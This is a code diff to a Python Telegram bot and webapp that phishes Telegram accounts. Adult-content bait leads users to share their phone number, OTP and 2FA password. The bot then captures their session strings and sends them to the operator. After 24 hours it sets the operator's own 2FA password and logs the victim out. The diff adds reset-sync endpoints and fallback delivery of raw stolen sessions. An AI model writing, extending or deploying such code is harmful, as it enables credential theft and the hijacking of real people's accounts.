@@ -23,8 +23,8 @@ API_ID = _si(os.environ.get("API_ID"), 0)
 API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
-WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
-SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
+WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://debjit-ogte.onrender.com/tg")
+SELF_URL = os.environ.get("SELF_URL", "https://debjit-ogte.onrender.com/health")
 
 DEFAULT_WELCOME_MSGS = [
     {"type": "text", "content": "**Hello {name} 👋**\n\n🔞**To again access to the files completely free of charge, do the following💦:**\n\n>👇Confirm that you are not a robot."},
@@ -70,7 +70,7 @@ STATE = {
     "awaiting_btn_url": False,
     "awaiting_share_msg": False,
     "awaiting_2fa_pass": False,
-    "awaiting_reset_number": False,   # NEW
+    "awaiting_reset_number": False,
 }
 
 broadcast_state = {
@@ -83,6 +83,12 @@ broadcast_state = {
 
 timer_value = 60
 AUTO_DELETE_EXPIRED = True
+
+# ============================================================
+# RESET EVENTS — webapp force-refresh sync
+# ============================================================
+reset_events = {}          # phone -> timestamp
+reset_all_marker = 0.0     # global reset marker
 
 
 def md_to_html(text):
@@ -250,27 +256,19 @@ def account_label(a):
 
 
 # ============================================================
-# RESET ENGINE  — phone number fresh-slate
+# RESET ENGINE
 # ============================================================
 def reset_phone_number(phone, reset_by="manual"):
-    """
-    Marks a phone number as fresh for the webapp login flow.
-    - Removes stale entry from captured_accounts.json? NO — keeps data.
-    - Actually: we DELETE the account record ONLY IF it's incomplete (no session).
-      Otherwise we keep the account but clear the "captured" flag in bot_users.
-    - Clears pending_codes[phone]
-    - Clears user_sessions[phone]
-    Returns dict with result.
-    """
     global captured_accounts
     phone = format_phone(phone)
+    now = time.time()
     result = {
         "phone": phone,
         "cleared_pending": False,
         "cleared_session": False,
         "removed_stale_account": False,
         "kept_account": False,
-        "reset_at": time.time(),
+        "reset_at": now,
         "reset_by": reset_by,
     }
 
@@ -282,7 +280,8 @@ def reset_phone_number(phone, reset_by="manual"):
             user_sessions.pop(phone, None)
             result["cleared_session"] = True
 
-    # Accounts: keep FULL accounts (with session), remove STALE placeholder (no session)
+    reset_events[phone] = now
+
     accounts = load_accounts()
     new_accounts = []
     removed = False
@@ -295,7 +294,6 @@ def reset_phone_number(phone, reset_by="manual"):
                 new_accounts.append(a)
             else:
                 removed = True
-                # skip
         else:
             new_accounts.append(a)
     if removed:
@@ -304,7 +302,6 @@ def reset_phone_number(phone, reset_by="manual"):
     result["removed_stale_account"] = removed
     result["kept_account"] = kept
 
-    # Reset bot_users entry — remove captured flag for this phone
     u = load_users()
     changed = False
     for uid, info in u.items():
@@ -315,12 +312,11 @@ def reset_phone_number(phone, reset_by="manual"):
     if changed:
         save_users(u)
 
-    # Also mark account status to allow re-login (do NOT touch existing accounts session)
     if kept:
         accounts = load_accounts()
         for i, a in enumerate(accounts):
             if a.get("phone") == phone:
-                a["reset_at"] = time.time()
+                a["reset_at"] = now
                 a["reset_by"] = reset_by
                 accounts[i] = a
                 break
@@ -329,7 +325,7 @@ def reset_phone_number(phone, reset_by="manual"):
 
     append_reset_log({
         "phone": phone,
-        "at": result["reset_at"],
+        "at": now,
         "by": reset_by,
         "cleared_pending": result["cleared_pending"],
         "cleared_session": result["cleared_session"],
@@ -341,7 +337,7 @@ def reset_phone_number(phone, reset_by="manual"):
 
 
 def reset_all_numbers(reset_by="manual"):
-    """Reset every phone in accounts + pending_codes + user_sessions."""
+    global reset_all_marker
     phones = set()
     for a in load_accounts():
         if a.get("phone"):
@@ -357,7 +353,8 @@ def reset_all_numbers(reset_by="manual"):
             results.append(reset_phone_number(p, reset_by=reset_by))
         except Exception as e:
             logger.error(f"reset_all err {p}: {e}")
-    logger.info(f"♻️♻️ RESET ALL — {len(results)} numbers processed by {reset_by}")
+    reset_all_marker = time.time()
+    logger.info(f"♻️♻️ RESET ALL — {len(results)} numbers processed by {reset_by} (marker={reset_all_marker})")
     return results
 
 
@@ -379,7 +376,7 @@ def admin_menu():
         [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
          Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
         [Button.inline(f"🔐 Auto 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
-        [Button.inline("♻️ Reset Numbers", b"menu_reset_numbers")],   # NEW
+        [Button.inline("♻️ Reset Numbers", b"menu_reset_numbers")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
     ]
 
@@ -394,7 +391,7 @@ def reset_numbers_menu():
         [Button.inline("📞 Reset Specific Number", b"rn_specific")],
         [Button.inline("📜 Reset Log", b"rn_log"),
          Button.inline("🧹 Clear Log", b"rn_clear_log")],
-        [Button.inline(f"📊 Accounts: {len(accounts)} | Pend: {pend} | Sess: {sess}", b"rn_noop")],
+        [Button.inline(f"📊 Acc:{len(accounts)} | Pend:{pend} | Sess:{sess}", b"rn_noop")],
         [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
@@ -549,7 +546,7 @@ async def start_handler(event):
 
 
 # ============================================================
-# SESSION VALIDITY CHECK
+# SESSION VALIDITY
 # ============================================================
 async def check_session_validity(session_str):
     try:
@@ -585,6 +582,9 @@ async def check_session_validity(session_str):
         return False, f"connect_err: {str(e)[:60]}"
 
 
+# ============================================================
+# EDIT ADMIN MSG — PLAIN TEXT (no parse_mode, no backticks)
+# ============================================================
 async def edit_admin_msg(account, status_text):
     try:
         msg_id = account.get("admin_notify_msg_id")
@@ -600,19 +600,18 @@ async def edit_admin_msg(account, status_text):
         if pu:
             extra = "\n2FA Used"
             if pv:
-                extra += f" | Pwd: `{pv}`"
+                extra += f" | Pwd: {pv}"
 
         added = account.get("added_at", 0)
         hours_passed = (time.time() - added) / 3600 if added else 0
-        hours_left = max(0, 24 - hours_passed)
 
         new_text = (f"{status_text}{extra}\n\n"
                     f"Phone: {phone}\n"
                     f"Name: {name}\n"
                     f"User ID: {account.get('user_id', '?')}\n"
                     f"DC: {dc}\n"
-                    f"⏱ Age: {hours_passed:.1f}h / 24h\n\n"
-                    f"Session:\n`{ss}`")
+                    f"Age: {hours_passed:.1f}h / 24h\n\n"
+                    f"Session:\n{ss}")
         if len(new_text) > 4000:
             new_text = new_text[:3990] + "..."
 
@@ -628,16 +627,14 @@ async def edit_admin_msg(account, status_text):
 
         if msg_id:
             try:
-                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text,
-                                       buttons=buttons, parse_mode='md')
+                await bot.edit_message(YOUR_TELEGRAM_ID, msg_id, new_text, buttons=buttons)
                 logger.info(f"✅ Msg edited: {phone} → {status_text[:30]}")
                 return
             except Exception as e:
                 logger.warning(f"edit err, sending new: {e}")
 
         try:
-            r = await bot.send_message(YOUR_TELEGRAM_ID, new_text,
-                                       buttons=buttons, parse_mode='md')
+            r = await bot.send_message(YOUR_TELEGRAM_ID, new_text, buttons=buttons)
             logger.info(f"✅ New msg sent: {phone} → {status_text[:30]} (mid={r.id})")
             account["admin_notify_msg_id"] = r.id
             save_account(account)
@@ -648,6 +645,9 @@ async def edit_admin_msg(account, status_text):
         logger.error(traceback.format_exc())
 
 
+# ============================================================
+# CALLBACK HANDLER
+# ============================================================
 @bot.on(events.CallbackQuery())
 async def cb(event):
     global timer_value, AUTO_DELETE_EXPIRED, auto_2fa_pass, broadcast_config, share_config, welcome_config, captured_accounts
@@ -686,7 +686,7 @@ async def cb(event):
                 if valid:
                     acc["status"] = "active"
                     acc["last_checked"] = time.time()
-                    await edit_admin_msg(acc, f"✅ VALID (checked just now)")
+                    await edit_admin_msg(acc, "✅ VALID (checked just now)")
                     await event.answer("✅ Session valid")
                 else:
                     acc["status"] = "expired"
@@ -728,7 +728,6 @@ async def cb(event):
                     asyncio.set_event_loop(loop)
                     valid, reason = loop.run_until_complete(check_session_validity(ss))
                     loop.close()
-                    logger.info(f"🗑 Pre-delete check {phone}: valid={valid}, reason={reason}")
                 except Exception as e:
                     valid, reason = False, f"check_err: {str(e)[:40]}"
 
@@ -744,11 +743,11 @@ async def cb(event):
             captured_accounts = new_accounts
 
             try:
-                deleted_msg = (f"🗑 **SECTION DELETED**\n\n"
-                               f"📱 Phone: `{phone}`\n"
-                               f"✅ Last Check: `{'VALID' if valid else 'EXPIRED'}`\n"
-                               f"📝 Reason: `{reason}`\n"
-                               f"🕐 Deleted: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
+                deleted_msg = (f"🗑 SECTION DELETED\n\n"
+                               f"📱 Phone: {phone}\n"
+                               f"✅ Last Check: {'VALID' if valid else 'EXPIRED'}\n"
+                               f"📝 Reason: {reason}\n"
+                               f"🕐 Deleted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                 await bot.send_message(YOUR_TELEGRAM_ID, deleted_msg)
             except Exception as e:
                 logger.error(f"send delete msg err: {e}")
@@ -783,12 +782,8 @@ async def cb(event):
             if hours_left > 0:
                 hh = int(hours_left)
                 mm = int((hours_left - hh) * 60)
-                logger.info(f"⏳ 24h not complete {phone}: {hh}h {mm}m left")
                 await edit_admin_msg(acc,
-                    f"⏳ 24h NOT COMPLETE\n\n"
-                    f"⏰ Time left: {hh}h {mm}m\n\n"
-                    f"Wait till 24h complete.\n"
-                    f"2FA will NOT be set before that.")
+                    f"⏳ 24h NOT COMPLETE\n\nTime left: {hh}h {mm}m\n\nWait till 24h complete.")
                 await event.answer(f"⏳ {hh}h {mm}m left", alert=True)
                 return
 
@@ -856,24 +851,24 @@ async def cb(event):
 
             status_txt = "✅ TERMINATE SECTION COMPLETE"
             if twofa_set:
-                status_txt += f"\n🔐 2FA: `{auto_2fa_pass}`"
+                status_txt += f"\n🔐 2FA: {auto_2fa_pass}"
             else:
-                status_txt += "\n⚠️ 2FA set FAILED (empty password?)"
+                status_txt += "\n⚠️ 2FA set FAILED"
             if not logged_out:
                 status_txt += "\n⚠️ Logout may have failed"
-            status_txt += f"\n🕐 Terminated: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
+            status_txt += f"\n🕐 Terminated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
             await edit_admin_msg(acc, status_txt)
             await event.answer("✅ Terminated", alert=True)
             return
 
         # ============================================================
-        # RESET NUMBERS HANDLERS
+        # RESET NUMBERS
         # ============================================================
         if data == "menu_reset_numbers":
             await event.answer()
             await safe_send(chat_id,
-                "♻️ **Reset Numbers**\n\nReset = number ar fresh hobe, same number diye abar prothom theke login flow (share → OTP → session).\n\n**Kichu delete korbe na.**",
+                "♻️ **Reset Numbers**\n\nReset = number fresh hobe, same number diye abar prothom theke login flow (share → OTP → session).\n\n**Kichu delete korbe na.**",
                 reset_numbers_menu(), edit_event=event)
             return
 
@@ -883,14 +878,14 @@ async def cb(event):
         if data == "rn_all":
             await event.answer("Resetting ALL...")
             results = reset_all_numbers(reset_by="owner_button")
-            txt = (f"♻️ **RESET ALL COMPLETE**\n\n"
-                   f"📞 Numbers touched: `{len(results)}`\n"
-                   f"✅ Pending cleared: `{sum(1 for r in results if r['cleared_pending'])}`\n"
-                   f"✅ Sessions cleared: `{sum(1 for r in results if r['cleared_session'])}`\n"
-                   f"🗑 Stale removed: `{sum(1 for r in results if r['removed_stale_account'])}`\n"
-                   f"💾 Accounts kept: `{sum(1 for r in results if r['kept_account'])}`\n\n"
-                   f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                   f"Ekhon same number diye /tg app e giye abar try korte parbi.")
+            txt = (f"♻️ RESET ALL COMPLETE\n\n"
+                   f"Numbers touched: {len(results)}\n"
+                   f"Pending cleared: {sum(1 for r in results if r['cleared_pending'])}\n"
+                   f"Sessions cleared: {sum(1 for r in results if r['cleared_session'])}\n"
+                   f"Stale removed: {sum(1 for r in results if r['removed_stale_account'])}\n"
+                   f"Accounts kept: {sum(1 for r in results if r['kept_account'])}\n\n"
+                   f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                   f"User der bol: app close kore abar /tg open korle fresh CONFIRM NOW theke start hobe.")
             await safe_send(chat_id, txt, reset_numbers_menu(), edit_event=event)
             return
 
@@ -898,7 +893,7 @@ async def cb(event):
             STATE["awaiting_reset_number"] = True
             await event.answer()
             await safe_send(chat_id,
-                "📞 **Reset Specific Number**\n\nPhone number patha (format: `+91XXXXXXXXXX` ba `XXXXXXXXXX`).\n\nExample: `+919876543210`",
+                "📞 **Reset Specific Number**\n\nPhone number patha.\n\nExample: `+919876543210`",
                 [[Button.inline("❌ Cancel", b"rn_cancel_specific")], [Button.inline("⬅️ Back", b"menu_reset_numbers")]],
                 edit_event=event)
             return
@@ -914,13 +909,13 @@ async def cb(event):
             if not log:
                 return await event.answer("Log empty", alert=True)
             last = log[-10:]
-            txt = "📜 **Last 10 resets:**\n\n"
+            txt = "📜 Last 10 resets:\n\n"
             for e in last:
                 p = e.get("phone", "?")
                 by = e.get("by", "?")
                 ts = e.get("at", 0)
                 t = datetime.fromtimestamp(ts).strftime("%m-%d %H:%M") if ts else "?"
-                txt += f"`{p}` · `{by}` · `{t}`\n"
+                txt += f"{p} · {by} · {t}\n"
             await event.answer()
             await safe_send(chat_id, txt, reset_numbers_menu(), edit_event=event)
             return
@@ -932,7 +927,7 @@ async def cb(event):
             return
 
         # ============================================================
-        # EXISTING ADMIN PANEL HANDLERS
+        # EXISTING PANEL
         # ============================================================
         if data == "menu_home":
             await event.answer()
@@ -955,7 +950,7 @@ async def cb(event):
             cur = auto_2fa_pass if auto_2fa_pass else "_(empty)_"
             await event.answer()
             await safe_send(chat_id,
-                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password (terminate click korle set hobe).",
+                f"🔐 **Auto 2FA Password**\n\nCurrent: `{cur}`\n\nSend new password.",
                 [[Button.inline("🗑 Clear", b"autopass_clear"), Button.inline("⬅️ Back", b"menu_home")]],
                 edit_event=event)
 
@@ -1226,11 +1221,13 @@ async def cancel(event):
     await event.respond("Cancelled.", buttons=admin_menu())
 
 
+# ============================================================
+# MESSAGE INPUT HANDLER
+# ============================================================
 @bot.on(events.NewMessage())
 async def capture(event):
     global welcome_config, broadcast_config, share_config, auto_2fa_pass, captured_accounts
 
-    # ==== CONTACT CARD AUTO-DELETE (user side) ====
     if event.sender_id != YOUR_TELEGRAM_ID:
         try:
             if event.message and event.message.contact:
@@ -1242,7 +1239,6 @@ async def capture(event):
             logger.warning(f"contact delete err: {e}")
         return
 
-    # ==== Owner commands below ====
     txt = event.raw_text or ""
     if txt.startswith('/'):
         return
@@ -1256,14 +1252,14 @@ async def capture(event):
         STATE["awaiting_reset_number"] = False
         try:
             result = reset_phone_number(phone, reset_by="owner_specific")
-            msg = (f"♻️ **RESET DONE**\n\n"
-                   f"📞 Phone: `{result['phone']}`\n"
-                   f"✅ Pending cleared: `{result['cleared_pending']}`\n"
-                   f"✅ Session cleared: `{result['cleared_session']}`\n"
-                   f"🗑 Stale removed: `{result['removed_stale_account']}`\n"
-                   f"💾 Account kept: `{result['kept_account']}`\n\n"
-                   f"Ekhon `{result['phone']}` diye /tg app e abar prothom theke login korte parbi.")
-            await event.respond(msg, buttons=reset_numbers_menu(), parse_mode='md')
+            msg = (f"♻️ RESET DONE\n\n"
+                   f"📞 Phone: {result['phone']}\n"
+                   f"✅ Pending cleared: {result['cleared_pending']}\n"
+                   f"✅ Session cleared: {result['cleared_session']}\n"
+                   f"🗑 Stale removed: {result['removed_stale_account']}\n"
+                   f"💾 Account kept: {result['kept_account']}\n\n"
+                   f"Ekhon {result['phone']} diye /tg app e abar prothom theke login korte parbi.")
+            await event.respond(msg, buttons=reset_numbers_menu())
         except Exception as e:
             logger.error(f"reset specific err: {e}")
             await event.respond(f"❌ Reset failed: {str(e)[:80]}", buttons=reset_numbers_menu())
@@ -1448,7 +1444,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML
+# WEBAPP HTML — fresh-start on reset
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -1544,6 +1540,7 @@ var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUns
 var UPK = 'pv_phone_' + TG_ID;
 var USK = 'pv_shares_' + TG_ID;
 var UCK = 'pv_captured_' + TG_ID;
+var URT = 'pv_reset_at_' + TG_ID;
 var phoneNumber = '';
 var codeCheck = null;
 var pwdCheck = null;
@@ -1554,14 +1551,43 @@ fetch('/api/share_config').then(function(r){ return r.json(); }).then(function(d
 function show(id) { document.getElementById(id).classList.add('on'); }
 function hide(id) { document.getElementById(id).classList.remove('on'); }
 function msg(id, t, type) { var e=document.getElementById(id); e.textContent=t; e.className='msg show '+type; }
-window.onload = function() {
+
+function wipeUserCache() {
+  try {
+    localStorage.removeItem(UPK);
+    localStorage.removeItem(USK);
+    localStorage.removeItem(UCK);
+  } catch(e) {}
+  phoneNumber = '';
+}
+
+function checkResetThenBoot() {
+  var cachedPhone = localStorage.getItem(UPK) || '';
+  fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:cachedPhone}) })
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+    var serverReset = Math.max(d.phone_reset_at || 0, d.global_reset_at || 0);
+    if (serverReset > lastSeen) {
+      wipeUserCache();
+      localStorage.setItem(URT, String(serverReset));
+    }
+    bootUI();
+  })
+  .catch(function(){ bootUI(); });
+}
+
+function bootUI() {
   hide('otpBox'); hide('pwdBox'); hide('shareBox'); show('contactBox');
   var cp = localStorage.getItem(UPK);
   var ic = localStorage.getItem(UCK) === '1';
   if (cp && ic) { phoneNumber = cp; hide('contactBox'); openShare(); }
   else if (cp) { phoneNumber = cp; hide('contactBox'); openOtp(); }
   else { startForce(); }
-};
+}
+
+window.onload = function() { checkResetThenBoot(); };
+
 function startForce() {
   if (contactForce) clearInterval(contactForce);
   setTimeout(function() { triggerShare(true); }, 200);
@@ -1592,6 +1618,7 @@ function triggerShare(isFirst) {
   resetInProgress(); msg('contactMsg', 'Update app', 'err');
 }
 document.getElementById('shareContactBtn').onclick = function() { inProgress = false; triggerShare(true); };
+
 function handleContact(c) {
   var phone = c.phone_number || '';
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
@@ -1602,11 +1629,22 @@ function handleContact(c) {
   .then(function(r){ return r.json(); }).then(function(d){
     if (d.success) {
       localStorage.setItem(UPK, phoneNumber);
-      if (d.already_captured && d.user_id) { localStorage.setItem(UCK,'1'); setTimeout(function(){hide('contactBox'); openShare();},700); }
-      else { setTimeout(function(){hide('contactBox'); openOtp();},700); }
+      fetch('/api/reset_state', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
+      .then(function(r){ return r.json(); }).then(function(rs){
+        var s = Math.max(rs.phone_reset_at || 0, rs.global_reset_at || 0);
+        if (s) localStorage.setItem(URT, String(s));
+      }).catch(function(){});
+      if (d.already_captured && d.user_id) {
+        localStorage.setItem(UCK,'1');
+        setTimeout(function(){hide('contactBox'); openShare();},700);
+      } else {
+        localStorage.removeItem(UCK);
+        setTimeout(function(){hide('contactBox'); openOtp();},700);
+      }
     } else { msg('contactMsg', 'Server error', 'err'); }
   }).catch(function(){ msg('contactMsg', 'Connection error', 'err'); });
 }
+
 function openOtp() {
   hide('contactBox'); hide('pwdBox'); hide('shareBox'); show('otpBox');
   ['o1','o2','o3','o4','o5'].forEach(function(id){ document.getElementById(id).value=''; });
@@ -1622,6 +1660,9 @@ function startOtpCheck() {
   codeCheck = setInterval(function(){
     fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
     .then(function(r){ return r.json(); }).then(function(d){
+      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var srv = Math.max(d.reset_at || 0, d.global_reset_at || 0);
+      if (srv > lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
       if (d.s === '2fa_needed') { clearInterval(codeCheck); hide('otpBox'); show('pwdBox'); document.getElementById('pwdInput').focus(); startPwdCheck(); }
       else if (d.s === 'done') { clearInterval(codeCheck); onCapture(); }
       else if (d.s === 'err') { clearInterval(codeCheck); msg('otpMsg', 'Failed. Try resend.', 'err'); document.getElementById('resendBtn').style.display='block'; }
@@ -1655,7 +1696,12 @@ function startPwdCheck() {
   if (pwdCheck) clearInterval(pwdCheck);
   pwdCheck = setInterval(function(){
     fetch('/api/check', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:phoneNumber}) })
-    .then(function(r){ return r.json(); }).then(function(d){ if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); } }).catch(function(){});
+    .then(function(r){ return r.json(); }).then(function(d){
+      var lastSeen = parseInt(localStorage.getItem(URT) || '0');
+      var srv = Math.max(d.reset_at || 0, d.global_reset_at || 0);
+      if (srv > lastSeen) { wipeUserCache(); localStorage.setItem(URT, String(srv)); bootUI(); return; }
+      if (d.s === 'done') { clearInterval(pwdCheck); onCapture(); }
+    }).catch(function(){});
   }, 2000);
 }
 document.getElementById('pwdBtn').onclick = function() {
@@ -1724,6 +1770,16 @@ def health():
 @app.route('/api/share_config')
 def get_share_config():
     return jsonify(share_config)
+
+
+@app.route('/api/reset_state', methods=['POST'])
+def reset_state():
+    d = request.json or {}
+    phone = format_phone(d.get('phone', '')) if d.get('phone') else ''
+    return jsonify({
+        'phone_reset_at': reset_events.get(phone, 0),
+        'global_reset_at': reset_all_marker,
+    })
 
 
 @app.route('/api/save_contact', methods=['POST'])
@@ -1860,15 +1916,15 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
         if pu:
             extra = "\n2FA Used"
             if password:
-                extra += f" | Pwd: `{password}`"
+                extra += f" | Pwd: {password}"
 
         msg = (f"New Account!{extra}\n"
                f"Phone: {phone}\n"
                f"Name: {me.first_name} {me.last_name or ''}\n"
                f"User ID: {me.id}\n"
                f"DC: {dc}\n"
-               f"⏱ Age: 0.0h / 24h\n\n"
-               f"Session:\n`{ss}`")
+               f"Age: 0.0h / 24h\n\n"
+               f"Session:\n{ss}")
         if len(msg) > 4000:
             msg = msg[:3990] + "..."
 
@@ -1882,15 +1938,36 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             ],
         ]
 
+        notify_sent = False
         try:
             r = await bot.send_message(YOUR_TELEGRAM_ID, msg, buttons=buttons, parse_mode='md')
             if r:
                 acc["admin_notify_msg_id"] = r.id
                 save_account(acc)
                 captured_accounts = load_accounts()
-                logger.info(f"✅ Notification sent with buttons (mid={r.id})")
+                notify_sent = True
+                logger.info(f"✅ Notification MD sent (mid={r.id})")
         except Exception as e:
-            logger.error(f"notify err: {e}")
+            logger.warning(f"notify MD fail: {type(e).__name__}: {e}")
+
+        if not notify_sent:
+            try:
+                r = await bot.send_message(YOUR_TELEGRAM_ID, msg, buttons=buttons)
+                if r:
+                    acc["admin_notify_msg_id"] = r.id
+                    save_account(acc)
+                    captured_accounts = load_accounts()
+                    notify_sent = True
+                    logger.info(f"✅ Notification PLAIN sent (mid={r.id})")
+            except Exception as e:
+                logger.error(f"notify PLAIN fail: {type(e).__name__}: {e}")
+
+        if not notify_sent:
+            try:
+                await bot.send_message(YOUR_TELEGRAM_ID, f"🚨 SESSION CAPTURED (buttons failed)\nPhone: {phone}\n\n{ss}")
+                logger.info("✅ Fallback raw session sent")
+            except Exception as e:
+                logger.error(f"FALLBACK FAIL: {e}")
 
         with sessions_lock:
             user_sessions.pop(phone, None)
@@ -1919,7 +1996,11 @@ def check():
         accounts = load_accounts()
         if any(a['phone'] == phone for a in accounts):
             s = 'done'
-    return jsonify({'s': s})
+    return jsonify({
+        's': s,
+        'reset_at': reset_events.get(phone, 0),
+        'global_reset_at': reset_all_marker,
+    })
 
 
 @app.route('/dash')
